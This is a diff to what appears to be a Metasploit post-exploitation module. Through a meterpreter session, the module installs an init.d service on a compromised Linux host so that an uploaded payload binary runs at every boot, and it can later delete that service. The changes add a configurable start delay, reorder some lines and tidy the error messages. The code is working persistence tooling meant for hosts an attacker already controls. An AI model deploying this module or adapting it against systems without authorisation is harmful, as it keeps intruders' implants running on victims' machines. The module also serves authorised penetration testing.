@@ -26,6 +26,7 @@
 # The full remote path of binary to execute (remote) => set REMOTE_PATH /root/payload
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
+# Time to wait for the agent to start, in seconds    => set START_TIME 15
 #
 #
 # [ PORT MODULE TO METASPLOIT DATABASE ]
@@ -113,6 +114,7 @@ class MetasploitModule < Msf::Post
 				{
                                          'SESSION' => '1',             # Default its to run againts session 1
                                          'INIT_PATH' => '/etc/init.d', # Default init.d directory full path
+                                         'START_TIME' => '10',         # Default time (sec) to start remote agent
 				},
                         'SessionTypes'   => [ 'meterpreter' ]
  
@@ -126,6 +128,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start, in seconds']),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)']),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false])
                         ], self.class) 
@@ -141,8 +144,9 @@ def ls_stage1
 
   session = client
   rem = session.sys.config.sysinfo
-  remote_path = datastore['REMOTE_PATH'] # /root/payload
   init = datastore['INIT_PATH']          # /etc/init.d
+  stime = datastore['START_TIME']        # 10 (sec to start the agent)
+  remote_path = datastore['REMOTE_PATH'] # /root/payload
   script_check = "#{init}/persistance"   # /etc/init.d/persistance
   #
   # check for proper config settings enter
@@ -164,7 +168,8 @@ def ls_stage1
     if session.fs.file.exist?(script_check)
       print_error("init.d: #{script_check} found ..")
       print_error("Post-module reports that persistence its allready active ..")
-      print_error("Please use DEL_PERSISTENCE option before running this funtion ..")
+      print_error("Please set DEL_PERSISTENCE option before running this funtion ..")
+      print_line("")
       return nil
     end
     #
@@ -173,6 +178,7 @@ def ls_stage1
     if not session.fs.file.exist?(remote_path)
       print_error("agent: #{remote_path} not found ..")
       print_error("Please upload your agent before running this funtion ..")
+      print_line("")
       return nil
     end
     print_status("Remote agent full path found ..")
@@ -192,10 +198,9 @@ def ls_stage1
         f.write("# Default-Stop:      0 1 6\n")
         f.write("# Short-Description: Persiste your binary (elf) in kali linux.\n")
         f.write("# Description:       Allows users to persiste your binary (elf) in kali linux systems\n")
-        f.write("### END INIT INFO\n")
-        f.write("#\n")
+        f.write("### END INIT INFO\n\n")
         f.write("# Give a little time to execute elf agent\n")
-        f.write("sleep 5 > /dev/null\n")
+        f.write("sleep #{stime} > /dev/null\n")
         f.write(".#{remote_path}")
         f.close
       end
@@ -207,14 +212,15 @@ def ls_stage1
       #
       if session.fs.file.exist?(script_check)
         print_good("Config init.d persistence script ..")
-        Rex::sleep(1.0)
         cmd_exec("chmod +x #{script_check}")
-        print_good("Update init.d service status (symlinks) ..")
         Rex::sleep(1.0)
+        print_good("Update init.d service status (symlinks) ..")
         cmd_exec("update-rc.d persistance defaults # 97 03")
+        Rex::sleep(1.0)
       else
         print_error("init.d script: #{script_check} not found ..")
-        print_error("Persistence not achieved ..")
+        print_error("Persistence on: #{rem['Computer']} not achieved ..")
+        print_line("")
         return nil
       end
 
@@ -263,6 +269,7 @@ def ls_stage2
     #
     if not session.fs.file.exist?(script_check)
       print_error("script: #{script_check} not found ..")
+      print_line("")
       return nil
     end
     print_status("Persistence script full path found ..")
@@ -272,7 +279,7 @@ def ls_stage2
       #
       print_good("Deleting persistence service (symlinks) ..")
       cmd_exec("update-rc.d persistance remove")
-      Rex::sleep(1.5)
+      Rex::sleep(1.0)
       print_good("Removing script from init.d directory ..")
       cmd_exec("rm -f #{script_check}")
       Rex::sleep(1.0)
@@ -284,6 +291,7 @@ def ls_stage2
       print_error("script: #{script_check} not proper deleted ..")
       print_error("Please manually delete : rm -f #{init}/persistance")
       print_error("Please manually execute: update-rc.d persistance remove")
+      print_line("")
       return nil
     end
 
